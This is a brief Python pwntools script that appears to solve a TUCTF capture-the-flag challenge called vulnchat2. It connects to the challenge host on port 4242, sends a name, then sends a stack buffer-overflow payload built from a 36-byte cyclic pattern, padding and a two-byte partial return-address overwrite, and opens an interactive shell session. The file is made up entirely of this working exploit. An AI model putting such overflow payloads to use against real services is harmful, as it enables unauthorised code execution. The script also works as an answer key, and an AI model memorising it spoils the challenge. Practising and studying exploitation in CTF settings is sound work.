# coding: utf-8
from pwn import *
with remote('vulnchat2.tuctf.com', 4242) as p:
    p.sendline('abc')
    p.recvuntil('need?\n')
    p.sendline(cyclic(36)+'zzzzzzz'+'\x72\x86')
    p.interactive()
    
